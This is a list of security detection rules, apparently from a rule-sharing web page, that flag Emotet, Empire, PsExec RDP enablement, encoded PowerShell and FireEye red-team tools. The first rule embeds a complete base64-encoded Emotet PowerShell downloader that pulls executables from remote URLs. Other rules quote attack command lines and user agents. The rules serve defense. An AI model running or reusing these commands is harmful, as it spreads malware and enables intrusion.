<li><a href="#">rule emotet_through_word_document_sysmon_behavior { meta: author = "Lee Archinal" description = "This content detects a sample of Emotet dropped through a Microsoft Word document. July saw an increase in Emotet attacks and samples License: ." reference = "" version = "0.01" created = "2020/07/20" product = "windows" service = "sysmon" mitre = "defense_evasion, execution, command_and_control, t1059.001, t1070.004, t1071.001" events: ((((((((((((($selection1.metadata.product_event_type = "1" and $selection1.target.process.file.full_path = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe" and $selection1.target.process.command_line = "powersheLL -e JAB6AGUAaQB0AG0AZQBpAHEAdQBzAGkAeABoAGEAaAA9ACcAeQBhAHcAcQB1AGkAbwBwAHQAbwBhAHkAdgBvAGkAawBrAG8AZQB6AGcAYQBlAHgAJwA7AFsATgBlAHQALgBTAGUAcgB2AGkAYwBlAFAAbwBpAG4AdABNAGEAbgBhAGcAZQByAF0AOgA6ACIAUwBgAGUAYABjAGAAVQBSAGkAVABgAHkAUAByAGAATwB0AG8AQwBvAGwAIgAgAD0AIAAnAHQAbABzADEAMgAsACAAdABsAHMAMQAxACwAIAB0AGwAcwAnADsAJAB0AGgAdQBhAHQAIAA9ACAAJwAxADMANwAnADsAJABzAGkAZQBxAHUAPQAnAHIAdQB1AG4AYwBoAG8AbwBkAHIAdQBhAGMAegBvAGUAeQAnADsAJABiAHUAbQBjAGgAbwB1AG4AaABhAG8AZgBjAGkAdgBzAG8AdQBtAD0AJABlAG4AdgA6AHUAcwBlAHIAcAByAG8AZgBpAGwAZQArACcAXAAnACsAJAB0AGgAdQBhAHQAKwAnAC4AZQB4AGUAJwA7ACQAdwBhAGcAbQB1AHUAdABoAGIAbwBpAHkAZABvAGcAdwBvAHUAcgBuAG8AdQB2AD0AJwB5AGUAaQBmAGIAdQBzACcAOwAkAGsAYQBmAHMAbwBpAGgAdABoAGEAbwBuAHIAYQB1AHcAcgB1AGEAagBwAG8AbwBuAD0ALgAoACcAbgBlACcAKwAnAHcALQBvAGIAagBlACcAKwAnAGMAJwArACcAdAAnACkAIABOAGUAdAAuAHcAZQBiAGMATABpAEUATgB0ADsAJABsAG8AYQBiAHQAaABlAG4AZgBpAGUAYgA9ACcAaAB0AHQAcAA6AC8ALwBhAHIAeQBhAGUAbgB0AGUAcgBwAHIAaQBzAGUAcwByAGIAbAAuAGMAbwBtAC8AdwBwAC0AYQBkAG0AaQBuAC8AdQBKADcAMgA3ADUAMwAyAC8AKgBoAHQAdABwADoALwAvAHcAdwB3AC4AbwBhAGsAZQBuAG8ALgBjAG8AbQAvAHcAcAAtAGEAZABtAGkAbgAvAHQAdgB5AFAATwAvACoAaAB0AHQAcABzADoALwAvAGMAaABhAHQAZgBsAGEAaQByAC4AYwBvAG0ALwBnAGUAbgBlAHIAYQBsAGwALwBQAEYAMABkAC8AKgBoAHQAdABwADoALwAvAGUAbQBhAHIAYwBsAG8AZgBpAHQAbgBlAHMAcwBhAGMAYQBkAGUAbQB5AC4AYwBvAG0ALwB4AGwAbgB3AGsALwBmAGQASgBJADMAMgA2ADIAMgAvACoAaAB0AHQAcAA6AC8ALwBkAHUAbwBjAGwAaQBlAHUAMgA0ADcALgBjAG8AbQAvAHcAcAAtAGMAbwBuAHQAZQBuAHQALwAzADQALwAnAC4AIgBzAHAATABgAGkAVAAiACgAWwBjAGgAYQByAF0ANAAyACkAOwAkAHMAYQBpAHcAeABlAGkAcgBxAHUAdQB1AHAAZwBlAHUAdwB0AG8AYQBxAHUAPQAnAHgAbwB1AGsAdwBpAGcAcQB1AGUAaQBmAGcAZQBvAHEAdQBtAGUAbwBiACcAOwBmAG8AcgBlAGEAYwBoACgAJABtAGkAZQBtAGQAdQBhAGQAeQBvAHUAbgBxAHUAYQB1AHgAdABhAGkAdgBjAGEAZQBoACAAaQBuACAAJABsAG8AYQBiAHQAaABlAG4AZgBpAGUAYgApAHsAdAByAHkAewAkAGsAYQBmAHMAbwBpAGgAdABoAGEAbwBuAHIAYQB1AHcAcgB1AGEAagBwAG8AbwBuAC4AIgBkAE8AVwBgAE4AbABgAE8AYQBkAGYASQBMAEUAIgAoACQAbQBpAGUAbQBkAHUAYQBkAHkAbwB1AG4AcQB1AGEAdQB4AHQAYQBpAHYAYwBhAGUAaAAsACAAJABiAHUAbQBjAGgAbwB1AG4AaABhAG8AZgBjAGkAdgBzAG8AdQBtACkAOwAkAHoAdQBqAD0AJwBkAGEAdAB0AGEAZQB4AG0AZQBhAHQAaABnAGUAcAB6AG8AZQBtACcAOwBJAGYAIAAoACgALgAoACcARwBlAHQALQBJACcAKwAnAHQAJwArACcAZQBtACcAKQAgACQAYgB1AG0AYwBoAG8AdQBuAGgAYQBvAGYAYwBpAHYAcwBvAHUAbQApAC4AIgBsAGUAYABOAEcAYABUAGgAIgAgAC0AZwBlACAAMwA5ADMANwAyACkAIAB7ACgAWwB3AG0AaQBjAGwAYQBzAHMAXQAnAHcAaQBuADMAMgBfAFAAcgBvAGMAZQBzAHMAJwApAC4AIgBDAGAAUgBFAEEAVABFACIAKAAkAGIAdQBtAGMAaABvAHUAbgBoAGEAbwBmAGMAaQB2AHMAbwB1AG0AKQA7ACQAdABoAG8AbwB2AD0AJwBqAGEAZQBzAGoAYQBxAHUAcgB1AHUAZgAnADsAYgByAGUAYQBrADsAJAB0AGgAZQBlAG4AZwBpAGEAdwBqAGkAbwBwAGwAbwBpAHMAPQAnAHEAdQBvAGIAZABpAGUAZABjAGgAaQBxAHUAcABvAHUAbgAnAH0AfQBjAGEAdABjAGgAewB9AH0AJABuAGEAbwBzAGgAdQBuAGgAYQB1AGsAdABlAHQAZgBpAG8AeQBnAGEAdQBqAD0AJwB3AGkAZQB0AGYAYQB6AHQAaABvAG8AZwBtAG8AdQBjAGgAJwA=" and $selection1.src.process.file.full_path = "C:\\Windows\\System32\\wbem\\WmiPrvSE.exe") or ($selection1.metadata.product_event_type = "11" and $selection1.target.process.file.full_path = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powersheLL.exe" and re.regex($selection1.target.registry.registry_key, `.*\\AppData\\Local\\Temp\\__PSScriptPolicyTest.*\.ps1`))) or ($selection1.metadata.product_event_type = "23" and $selection1.target.process.file.full_path = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powersheLL.exe" and re.regex($selection1.target.registry.registry_key, `.*\\AppData\\Local\\Temp\\__PSScriptPolicyTest.*\.ps1`))) or ($selection1.metadata.product_event_type = "11" and $selection1.target.process.file.full_path = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powersheLL.exe" and re.regex($selection1.target.file.full_path, `C:\\Users.*\.exe`))) or ($selection1.metadata.product_event_type = "3" and $selection1.target.process.file.full_path = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe" and $selection1.target.ip = "50.62.168.3")) or ($selection1.metadata.product_event_type = "11" and re.regex($selection1.target.process.file.full_path, `C:\\Users.*\.exe`) and re.regex($selection1.target.file.full_path, `.*\\AppData\\Local.*`))) or ($selection1.metadata.product_event_type = "1" and re.regex($selection1.target.process.file.full_path, `.*\\AppData\\Local\\NlsData0009\\url\.exe`))) or ($selection1.metadata.product_event_type = "3" and re.regex($selection1.target.process.file.full_path, `.*\\AppData\\Local\\NlsData0009\\url\.exe`) and $selection1.target.ip = "181.30.69.50")) or ($selection1.metadata.product_event_type = "11" and re.regex($selection1.target.process.file.full_path, `.*\\AppData\\Local\\NlsData0009\\url\.exe`) and re.regex($selection1.target.file.full_path, `.*\\AppData\\Local\\NlsData0009\\KBDYBAa52\.exe`))) or ($selection1.metadata.product_event_type = "1" and re.regex($selection1.target.process.file.full_path, `.*\\AppData\\Local\\NlsData0009\\KBDYBAa52\.exe`) and re.regex($selection1.target.process.command_line, `.*zAMAACAAAABOAGwAcwBEAGEAdABhADAAMAAwADkAXAB1AHIAbAAAAA==`))) or ($selection1.metadata.product_event_type = "11" and re.regex($selection1.target.process.file.full_path, `.*\\AppData\\Local\\NlsData0009\\url\.exe`) and re.regex($selection1.target.file.full_path, `.*\\AppData\\Local\\NlsData0009\\AppointmentActivationa69\.exe`))) or ($selection1.metadata.product_event_type = "1" and $selection1.target.process.file.full_path = "C:\\Windows\\SysWOW64\\cmd.exe" and re.regex($selection1.target.process.command_line, `C:\\Windows\\System32\\cmd\.exe /c ping\.exe -n 6 127\.0\.0\.1 & type C:\\Windows\\System32\\calc\.exe > .*\\AppData\\Local\\NlsData0009\\AppointmentActivationa69\.exe`) and re.regex($selection1.src.process.file.full_path, `.*\\AppData\\Local\\NlsData0009\\AppointmentActivationa69\.exe`))) or ($selection1.metadata.product_event_type = "1" and $selection1.target.process.file.full_path = "C:\\Windows\\SysWOW64\\PING.EXE" and $selection1.target.process.command_line = "ping.exe -n 6 127.0.0.1")) condition: $selection1 
<li><a href="#">rule empire_monkey { meta: author = "Markus Neis" description = "Detects EmpireMonkey APT reported Activity License: ." reference = "" version = "0.01" created = "2019/04/02" category = "process_creation" product = "windows" mitre = "t1086, execution" events: (re.regex($selection_cutil.target.process.command_line, `.*/i:%APPDATA%\\logs\.txt scrobj\.dll`) and (re.regex($selection_cutil.target.process.file.full_path, `.*\\cutil\.exe`) or $selection_cutil.metadata.description = "Microsoft(C) Registerserver")) condition: $selection_cutil 
<li><a href="#">rule empire_powershell_uac_bypass { meta: author = "Ecco" description = "Detects some Empire PowerShell UAC bypass methods License: ." reference = "" version = "0.01" created = "2019/08/30" category = "process_creation" product = "windows" mitre = "defense_evasion, privilege_escalation, t1088, car.2019-04-001" events: ((re.regex($selection.target.process.command_line, `.* -NoP -NonI -w Hidden -c $x=$\(\(gp HKCU:Software\\\\Microsoft\\\\Windows Update\)\.Update\).*`) or re.regex($selection.target.process.command_line, `.* -NoP -NonI -c $x=$\(\(gp HKCU:Software\\\\Microsoft\\\\Windows Update\)\.Update\);.*`)) and ($selection.metadata.product_event_type = "4688" or $selection.metadata.product_event_type = "1")) condition: $selection 
<li><a href="#">rule empire_user_agents_proxy { meta: author = "Alexandr Yampolskyi, SOC Prime" description = "Empire User Agents Detection. License: ." reference = "" version = "0.01" created = "2019/02/27" product = "proxy" mitre = "Command and Control, t1071" events: ($selection.src.application = "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko" or $selection.src.application = "Mozilla/6.0 (X11; Linux x86_64; rv:24.0) Gecko/20140205 Firefox/27.0 Iceweasel/25.3.0" or $selection.src.application = "Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0") condition: $selection 
<li><a href="#">rule enabling_rdp_remotely_using_psexec { meta: author = "Ruslan Mikhalov, SOC Prime Team" description = "Detects enabling RDP remotely via PsExec. License: ." reference = "" version = "0.01" created = "2018/03/13" product = "windows" service = "sysmon" mitre = "Defense Evasion, t1112, Execution, t1059" events: ($sysmon_remoterdpenable.metadata.product_event_type = "1" and re.regex($sysmon_remoterdpenable.target.process.file.full_path, `.*\\reg\.exe`) and $sysmon_remoterdpenable.target.process.command_line = "\"reg\" add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f" and re.regex($sysmon_remoterdpenable.src.process.command_line, `.*\\PSEXESVC\.exe`)) condition: $sysmon_remoterdpenable 
<li><a href="#">rule encoded_frombase64string { meta: author = "Florian Roth" description = "Detects a base64 encoded FromBase64String keyword in a process command line License: ." reference = "" version = "0.01" created = "2019/08/24" category = "process_creation" product = "windows" mitre = "t1086, t1140, execution, defense_evasion" events: ((re.regex($selection.target.process.command_line, `.*OjpGcm9tQmFzZTY0U3RyaW5n.*`) or re.regex($selection.target.process.command_line, `.*o6RnJvbUJhc2U2NFN0cmluZ.*`) or re.regex($selection.target.process.command_line, `.*6OkZyb21CYXNlNjRTdHJpbm.*`)) and ($selection.metadata.product_event_type = "4688" or $selection.metadata.product_event_type = "1")) condition: $selection 
<li><a href="#">rule encoded_iex { meta: author = "Florian Roth" description = "Detects a base64 encoded IEX command string in a process command line License: ." reference = "" version = "0.01" created = "2019/08/23" category = "process_creation" product = "windows" mitre = "t1086, t1140, execution" events: ((re.regex($selection.target.process.command_line, `.*SUVYIChb.*`) or re.regex($selection.target.process.command_line, `.*lFWCAoW.*`) or re.regex($selection.target.process.command_line, `.*JRVggKF.*`) or re.regex($selection.target.process.command_line, `.*aWV4IChb.*`) or re.regex($selection.target.process.command_line, `.*lleCAoW.*`) or re.regex($selection.target.process.command_line, `.*pZXggKF.*`) or re.regex($selection.target.process.command_line, `.*aWV4IChOZX.*`) or re.regex($selection.target.process.command_line, `.*lleCAoTmV3.*`) or re.regex($selection.target.process.command_line, `.*pZXggKE5ld.*`) or re.regex($selection.target.process.command_line, `.*SUVYIChOZX.*`) or re.regex($selection.target.process.command_line, `.*lFWCAoTmV3.*`) or re.regex($selection.target.process.command_line, `.*JRVggKE5ld.*`)) and ($selection.metadata.product_event_type = "4688" or $selection.metadata.product_event_type = "1")) condition: $selection 
<li><a href="#">rule evasion_base64_decode_arguments_in_powershell_possible_apt29_activity { meta: author = "Roman Ranskyi" description = "Powershell command included some specific obfuscation, which may indicate attempts to bypass specific detection logic. License: ." reference = "" version = "0.01" created = "2021-03-09" product = "windows" service = "sysmon" mitre = "Defense Evasion, t1027, Execution, t1086" events: ($selection0.metadata.product_event_type = "1" and $selection0.target.process.command_line = "'FromBase\\'+0x40+\\'String\\'") condition: $selection0 
<li><a href="#">rule eventlog_cleared { meta: author = "Florian Roth" description = "One of the Windows Eventlogs has been cleared. e.g. caused by \"wevtutil cl\" command execution License: ." reference = "" version = "0.01" created = "2021-03-09" product = "windows" service = "system" mitre = "defense_evasion, t1070, car.2016-04-002" events: ($selection.metadata.product_event_type = "104" and $selection.src.application = "Microsoft-Windows-Eventlog") condition: $selection 
<li><a href="#">rule executables_started_in_suspicious_folder { meta: author = "Florian Roth" description = "Detects process starts of binaries from a suspicious folder License: ." reference = "" version = "0.01" created = "2017/10/14" category = "process_creation" product = "windows" mitre = "defense_evasion, t1036" events: ((re.regex($selection.target.process.file.full_path, `C:\\PerfLogs\\.*`) or re.regex($selection.target.process.file.full_path, `C:\\$Recycle\.bin\\.*`) or re.regex($selection.target.process.file.full_path, `C:\\Intel\\Logs\\.*`) or re.regex($selection.target.process.file.full_path, `C:\\Users\\Default\\.*`) or re.regex($selection.target.process.file.full_path, `C:\\Users\\Public\\.*`) or re.regex($selection.target.process.file.full_path, `C:\\Users\\NetworkService\\.*`) or re.regex($selection.target.process.file.full_path, `C:\\Windows\\Fonts\\.*`) or re.regex($selection.target.process.file.full_path, `C:\\Windows\\Debug\\.*`) or re.regex($selection.target.process.file.full_path, `C:\\Windows\\Media\\.*`) or re.regex($selection.target.process.file.full_path, `C:\\Windows\\Help\\.*`) or re.regex($selection.target.process.file.full_path, `C:\\Windows\\addins\\.*`) or re.regex($selection.target.process.file.full_path, `C:\\Windows\\repair\\.*`) or re.regex($selection.target.process.file.full_path, `C:\\Windows\\security\\.*`) or re.regex($selection.target.process.file.full_path, `.*\\RSA\\MachineKeys\\.*`) or re.regex($selection.target.process.file.full_path, `C:\\Windows\\system32\\config\\systemprofile\\.*`)) and ($selection.metadata.product_event_type = "4688" or $selection.metadata.product_event_type = "1")) condition: $selection 
<li><a href="#">rule execution_in_nonexecutable_folder { meta: author = "Florian Roth" description = "Detects a suspicious exection from an uncommon folder License: ." reference = "" version = "0.01" created = "2021-03-09" category = "process_creation" product = "windows" mitre = "defense_evasion, t1036" events: ((re.regex($selection.target.process.file.full_path, `.*\\$Recycle\.bin`) or re.regex($selection.target.process.file.full_path, `.*\\Users\\All Users\\.*`) or re.regex($selection.target.process.file.full_path, `.*\\Users\\Default\\.*`) or re.regex($selection.target.process.file.full_path, `.*\\Users\\Public\\.*`) or re.regex($selection.target.process.file.full_path, `C:\\Perflogs\\.*`) or re.regex($selection.target.process.file.full_path, `.*\\config\\systemprofile\\.*`) or re.regex($selection.target.process.file.full_path, `.*\\Windows\\Fonts\\.*`) or re.regex($selection.target.process.file.full_path, `.*\\Windows\\IME\\.*`) or re.regex($selection.target.process.file.full_path, `.*\\Windows\\addins\\.*`)) and ($selection.metadata.product_event_type = "4688" or $selection.metadata.product_event_type = "1")) condition: $selection 
<li><a href="#">rule execution_in_outlook_temp_folder { meta: author = "Florian Roth" description = "Detects a suspicious program execution in Outlook temp folder License: ." reference = "" version = "0.01" created = "2019/10/01" category = "process_creation" product = "windows" mitre = "initial_access, t1193" events: (re.regex($selection.target.process.file.full_path, `.*\\Temporary Internet Files\\Content\.Outlook\\.*`) and ($selection.metadata.product_event_type = "4688" or $selection.metadata.product_event_type = "1")) condition: $selection 
<li><a href="#">rule existing_service_modified_detector_sysmon_behavior { meta: author = "Lee Archinal (content)" description = "Detects modification of existing services's binpPath License: ." reference = "" version = "0.01" created = "2019/07/06" product = "windows" service = "sysmon" mitre = "persistence, t1031" events: (($selection1.metadata.product_event_type = "1" and $selection1.target.process.file.full_path = "C:\\Windows\\System32\\sc.exe" and re.regex($selection1.target.process.command_line, `sc config .* binpPath= .*`) and $selection1.src.process.file.full_path = "C:\\Windows\\System32\\cmd.exe") or ($selection1.metadata.product_event_type = "13" and $selection1.target.process.file.full_path = "C:\\Windows\\System32\\services.exe" and re.regex($selection1.target.registry.registry_key, `HKLM\\System\\CurrentControlSet\\services.*\\ImagePath`))) condition: $selection1 
<li><a href="#">rule exploit_for_cve20151641 { meta: author = "Florian Roth" description = "Detects Winword starting uncommon sub process MicroScMgmt.exe as used in exploits for CVE-2015-1641 License: ." reference = "" version = "0.01" created = "2018/02/22" category = "process_creation" product = "windows" mitre = "defense_evasion, t1036" events: (re.regex($selection.src.process.file.full_path, `.*\\WINWORD\.EXE`) and re.regex($selection.target.process.file.full_path, `.*\\MicroScMgmt\.exe `) and ($selection.metadata.product_event_type = "4688" or $selection.metadata.product_event_type = "1")) condition: $selection 
<li><a href="#">rule exploit_framework_user_agent { meta: author = "Florian Roth" description = "Detects suspicious user agent strings used by exploit / pentest framworks like Metasploit in proxy logs License: ." reference = "" version = "0.01" created = "2021-03-09" category = "proxy" events: (re.regex($selection.src.application, `Internet Explorer .*`) or $selection.src.application = "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; InfoPath.2)" or $selection.src.application = "Mozilla/4.0 (compatible; Metasploit RSPEC)" or $selection.src.application = "Mozilla/4.0 (compatible; MSIE 6.1; Windows NT)" or $selection.src.application = "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)" or $selection.src.application = "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)" or $selection.src.application = "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0)" or $selection.src.application = "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; Trident/4.0; SIMBAR={7DB0F6DE-8DE7-4841-9084-28FA914B0F2E}; SLCC1; .N" or $selection.src.application = "Mozilla/5.0 (compatible; Googlebot/2.1; +)" or $selection.src.application = "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/525.13 (KHTML, like Gecko) Chrome/4.0.221.6 Safari/525.13" or $selection.src.application = "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; MAAU)" or $selection.src.application = "Mozilla/5.0" or $selection.src.application = "Mozilla/4.0 (compatible; SPIPE/1.0" or $selection.src.application = "Mozilla/5.0 (Windows NT 6.3; rv:39.0) Gecko/20100101 Firefox/35.0" or $selection.src.application = "Sametime Community Agent" or $selection.src.application = "X-FORWARDED-FOR" or $selection.src.application = "DotDotPwn v2.1" or $selection.src.application = "SIPDROID" or $selection.src.application = "Mozilla/5.0 (Windows NT 10.0; Win32; x32; rv:60.0)" or re.regex($selection.src.application, `.*wordpress hash grabber.*`) or re.regex($selection.src.application, `.*exploit.*`)) condition: $selection 
<li><a href="#">rule exploited_cve202010189_zoho_manageengine { meta: author = "Florian Roth" description = "Detects the exploitation of Zoho ManageEngine Desktop Central Java Deserialization vulnerability reported as CVE-2020-10189 License: ." reference = "" version = "0.01" created = "2020/03/25" category = "process_creation" product = "windows" mitre = "launch, t1377" events: (re.regex($selection.src.process.file.full_path, `.*DesktopCentral_Server\\jre\\bin\\java\.exe`) and (re.regex($selection.target.process.file.full_path, `.*\\cmd\.exe`) or re.regex($selection.target.process.file.full_path, `.*\\powershell\.exe`) or re.regex($selection.target.process.file.full_path, `.*\\bitsadmin\.exe`)) and ($selection.metadata.product_event_type = "4688" or $selection.metadata.product_event_type = "1")) condition: $selection 
<li><a href="#">rule fake_zoom_installerexe_devil_shadow_botnet { meta: author = "Emir Erdogan" description = "This rule detects to devil shadow botnet activities with fake zoom installer exe. License: ." reference = "" version = "0.01" created = "2021-03-09" category = "windows" product = "sysmon" mitre = "T1055, T1179, T1215, T1065, T1045" events: (((re.regex($selection.src.process.file.full_path, `.*/Zoominstaller\.exe `) or re.regex($selection.src.process.file.full_path, `.*/wscript\.exe`)) and re.regex($selection.target.process.file.full_path, `.*/cmd\.exe`) and re.regex($selection.target.process.command_line, `.*pyclient\.cmd.*`)) or (re.regex($selection.src.process.file.full_path, `.*/cmd\.exe`) and (re.regex($selection.target.process.file.full_path, `.*/tasklist\.exe`) or re.regex($selection.target.process.file.full_path, `.*/attrib\.exe`) or re.regex($selection.target.process.file.full_path, `.*/reg\.exe`)) and (re.regex($selection.target.process.command_line, `.*D3ViL ShaDow.*`) or re.regex($selection.target.process.command_line, `.*botnet.*`) or re.regex($selection.target.process.command_line, `.*boot-startup\.vbs.*`)))) condition: $selection 
<li><a href="#">rule fallout_rig_ek_delivers_raccoon_stealer { meta: author = "Emir Erdogan" description = "Raccoon Stealer License: ." reference = "" version = "0.01" created = "2019/11/24" product = "windows" service = "sysmon" mitre = "T1140, T1059, T1005, T1022, T1105, T1057" events: (((re.regex($selection1.target.process.file.full_path, `.*\\cvtres\.exe`) and re.regex($selection1.src.process.file.full_path, `.*\\csc\.exe`)) or ($selection1.metadata.product_event_type = "1" and (re.regex($selection1.target.process.file.full_path, `.*\\csc\.exe`) or re.regex($selection1.target.process.file.full_path, `.*\\AyJWa1N0\.tmp`)) and re.regex($selection1.src.process.file.full_path, `.*\\powershell\.exe`))) or (re.regex($selection1.target.process.file.full_path, `.*\\cmd\.exe`) and re.regex($selection1.src.process.file.full_path, `.*\\AyJWa1N0\.tmp`))) condition: $selection1 
<li><a href="#">rule file_creation_time_changed_via_powershell { meta: author = "Lee Archinal (content) Aric Gady (threat emulation)" description = "Detects Timestomping activities through PowerShell License: ." reference = "" version = "0.01" created = "2019/06/30" product = "windows" service = "sysmon" mitre = "defense_evasion, t1099" events: ($selection.metadata.product_event_type = "2" and re.regex($selection.target.process.file.full_path, `.*\\powershell\.exe`)) condition: $selection 
<li><a href="#">rule file_deletion_via_cmd_via_cmdline { meta: author = "Ariel Millahuel" description = "Detects \"cmd\" utilization to self-delete files in some critical Windows destinations. License: ." reference = "" version = "0.01" created = "2019/11/20" category = "process_creation" product = "windows" mitre = "defense_evasion, t1070, t1070.004" events: (re.regex($selection.target.process.command_line, `.*cmd.*`) and ($selection.metadata.product_event_type = "4688" or $selection.metadata.product_event_type = "1") and (re.regex($selection.target.process.command_line, `.*/c.*`) or re.regex($selection.target.process.command_line, `.*ping 127\.0\.0\.1.*`) or re.regex($selection.target.process.command_line, `.*&.*`) or re.regex($selection.target.process.command_line, `.*del.*`) or re.regex($selection.target.process.command_line, `.*/f.*`) or re.regex($selection.target.process.command_line, `.*/q.*`)) and (re.regex($selection.target.process.command_line, `.*\\Windows\\Temp.*`) or re.regex($selection.target.process.command_line, `.*\\AppData\\Roaming\\Microsoft.*`))) condition: $selection 
<li><a href="#">rule fileless_attack_via_regsvr32exe { meta: author = "Ariel Millahuel" description = "Detects suspicious behavior in the utilization of regsvr32.exe and also a possible fileless attack via this executable. License: ." reference = "" version = "0.01" created = "2019/11/26" category = "process_creation" product = "windows" mitre = "execution, defense evasion, t1218, t1218.010, t1059, t1059.003" events: (re.regex($selection.target.process.command_line, `.*regsvr32.*`) and ($selection.metadata.product_event_type = "4688" or $selection.metadata.product_event_type = "1") and re.regex($selection.target.process.command_line, `.*/s.*`) and re.regex($selection.target.process.command_line, `.*/i.*`) and (re.regex($selection.target.process.command_line, `.*\.txt.*`) or re.regex($selection.target.process.command_line, `.*\.dll.*`))) condition: $selection 
<li><a href="#">rule fireeye_red_team_tool__adpasshunt_via_cmdline { meta: author = "SOC Prime Team, FireEye" description = "This rule has been ported from Fireeye's HXIOC format to SIGMA. It detects the Fireeye tool AdPassHunt License: ." reference = "" version = "0.01" created = "2021-03-09" category = "process_creation" product = "windows" mitre = "credential_access, t1003.003, t1552.006" events: (re.regex($selection_image.target.process.file.full_path, `.*\\adpasshunt\.exe`) or (re.regex($selection_image.target.process.command_line, `.*dc.*`) and re.regex($selection_image.target.process.command_line, `.*domain.*`) and re.regex($selection_image.target.process.command_line, `.*action.*`) and ($selection_image.metadata.product_event_type = "4688" or $selection_image.metadata.product_event_type = "1") and (re.regex($selection_image.target.process.command_line, `.*gpp.*`) or re.regex($selection_image.target.process.command_line, `.*ad.*`)))) condition: $selection_image 
<li><a href="#">rule fireeye_red_team_tool__execavatorexe_via_cmdline { meta: author = "SOC Prime Team, FireEye" description = "This rule has been ported from Fireeye's HXIOC format to SIGMA. It detects the Fireeye tool excavator.exe License: ." reference = "" version = "0.01" created = "2021-03-09" category = "process_creation" product = "windows" mitre = "credential_access, t1003.001" events: (re.regex($selection_image.target.process.file.full_path, `.*\\excavator\.exe`) or re.regex($selection_image.target.file.full_path, `.*\\excavator\.exe`)) condition: $selection_image 
<li><a href="#">rule fireeye_red_team_tool__execavatorexe_via_registry { meta: author = "SOC Prime Team, FireEye" description = "This rule has been ported from Fireeye's HXIOC format to SIGMA. It detects the Fireeye tool excavator.exe making a registry change affecting the iphlpsvc6 service. License: ." reference = "" version = "0.01" created = "2021-03-09" product = "windows" category = "registry_event" mitre = "credential_access, t1003.001" events: ($selection.metadata.event_type = "SetValue" and re.regex($selection.target.registry.registry_key, `.*CurrentControlSet\\services\\iphlpsvc6\\ImagePath`)) condition: $selection 
<li><a href="#">rule fireeye_red_team_tool__g2js_suspicious_process_tree { meta: author = "Sittikorn S, FireEye" description = "This rule has been ported from Fireeye's HXIOC format to SIGMA. It detects the Fireeye tool GadgetToJScript(G2JS). License: ." reference = "" version = "0.01" created = "2020/12/11" category = "process_creation" product = "windows" mitre = "execution, defense_evasion, t1218.005, t1059" events: ((re.regex($selection.target.process.file.full_path, `.*userinit\.exe.*`) or re.regex($selection.target.process.file.full_path, `.*colorcpl\.exe.*`)) and (re.regex($selection.src.process.file.full_path, `.*mshta\.exe.*`) or re.regex($selection.src.process.file.full_path, `.*cscript\.exe.*`) or re.regex($selection.src.process.file.full_path, `.*wscript\.exe.*`)) and ($selection.metadata.product_event_type = "4688" or $selection.metadata.product_event_type = "1")) condition: $selection 
<li><a href="#">rule fireeye_red_team_tool__modified_impacket_smbexec_via_cmdline { meta: author = "SOC Prime Team, FireEye" description = "This rule has been ported from Fireeye's HXIOC format to SIGMA. It detects a modified implmentation of SMBEXEC by FireEye. License: ." reference = "" version = "0.01" created = "2021-03-09" category = "process_creation" product = "windows" mitre = "lateral_movement, execution, t1021.002, t1543.003, t1036.004" events: ((re.regex($selection1.src.process.file.full_path, `.*services\.exe`) and re.regex($selection1.target.process.file.full_path, `.*cmd\.exe`) and re.regex($selection1.target.process.command_line, `.*/q /K echo.*`) and re.regex($selection1.target.process.command_line, `.*2>1.*`) and re.regex($selection1.target.process.command_line, `.*& del .*`) and ($selection1.metadata.product_event_type = "4688" or $selection1.metadata.product_event_type = "1")) and (re.regex($selection1.target.process.command_line, `.*setupapi\.dev\.log.*`) or re.regex($selection1.target.process.command_line, `.*install\.bat.*`))) condition: $selection1 
<li><a href="#">rule fireeye_red_team_tool__modified_impacket_smbexec_via_registry { meta: author = "SOC Prime Team, FireEye" description = "This rule has been ported from Fireeye's HXIOC format to SIGMA. It detects a modified implmentation of SMBEXEC by FireEye. License: ." reference = "" version = "0.01" created = "2021-03-09" product = "windows" category = "registry_event" mitre = "lateral_movement, execution, t1021.002, t1543.003, t1036.004" events: ((re.regex($selection1.target.registry.registry_key, `.*ImagePath.*`) and re.regex($selection1.metadata.description, `.*%COMSPEC%.*`) and re.regex($selection1.metadata.description, `.*/q.*`) and re.regex($selection1.metadata.description, `.*/k.*`) and re.regex($selection1.metadata.description, `.*echo.*`)) or ($selection1.metadata.event_type = "SetValue" and re.regex($selection1.target.registry.registry_key, `.*CurrentControlSet\\Services.*`) and (re.regex($selection1.target.registry.registry_key, `.*Windows Update Control Service.*`) or re.regex($selection1.target.registry.registry_key, `.*Windows 10 Defender.*`) or re.regex($selection1.target.registry.registry_key, `.*Windows License Key Activation.*`) or re.regex($selection1.target.registry.registry_key, `.*Office 365 Proxy.*`) or re.regex($selection1.target.registry.registry_key, `.*Microsoft Security Center.*`) or re.regex($selection1.target.registry.registry_key, `.*Windows Update.*`) or re.regex($selection1.target.registry.registry_key, `.*Secure Token Messaging Service.*`) or re.regex($selection1.target.registry.registry_key, `.*Background Action Manager.*`) or re.regex($selection1.target.registry.registry_key, `.*OneDrive Sync Center.*`)))) condition: $selection1 
